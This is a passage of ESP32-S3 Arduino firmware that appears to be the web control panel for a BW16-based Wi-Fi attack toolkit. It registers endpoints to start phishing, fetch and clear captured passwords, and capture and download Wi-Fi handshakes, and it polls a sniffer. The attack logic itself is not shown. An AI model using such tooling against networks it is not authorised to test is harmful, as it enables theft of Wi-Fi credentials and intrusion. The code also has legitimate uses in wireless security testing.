  server.on("/api/reboot", HTTP_POST, hReboot);
  server.on("/api/phishing/start", HTTP_POST, hPhishingStart);
  server.on("/api/phishing/passwords", HTTP_GET, hPhishPasswords);
  server.on("/api/phishing/clear", HTTP_POST, hPhishClear);
  server.on("/handshake/select", HTTP_POST, hHsSelect);
  server.on("/handshake/capture", HTTP_POST, hHsCapture);
  server.on("/handshake/status", HTTP_GET, hHsStatus);
  server.on("/handshake/stop", HTTP_POST, hHsStop);
  server.on("/handshake/download", HTTP_GET, hHsDownload);
  server.onNotFound([]() { server.send(404, "text/plain", "404"); });
  server.begin();
}

static void wifiSetup() {
  WiFi.mode(WIFI_STA);
  WiFi.setHostname(WIFI_HOSTNAME);
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  Serial.print("[S3] 连接家里WiFi");
  unsigned long t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 30000) {
    delay(300);
    Serial.print(".");
  }
  Serial.println();
  if (WiFi.status() == WL_CONNECTED) {
    Serial.print("[S3] 已连接, IP: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("[S3] WiFi 连接失败，将继续重试（Web 不可用）");
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("\n==== ESP32-S3 控制中心 for BW16-Tools ====");
  bw16Init();          // UART 链路
  buttonsInit();
  oledInit();
  wifiSetup();
  webSetup();
  Serial.println("[S3] 启动完成");
}

void loop() {
  // WiFi 断线自动重连
  static unsigned long lastWifiCheck = 0;
  if (WiFi.status() != WL_CONNECTED && millis() - lastWifiCheck > 5000) {
    lastWifiCheck = millis();
    WiFi.reconnect();
  }
  server.handleClient();
  // v25j 异步嗅探：非阻塞收响应（期间 WebServer 保持响应）
  if (g_sniffActive) {
    pollSniff();
    if (g_sniffDone) finalizeSniff();
  }
  oledHandleButton(buttonsLoop());
  oledLoop();
}
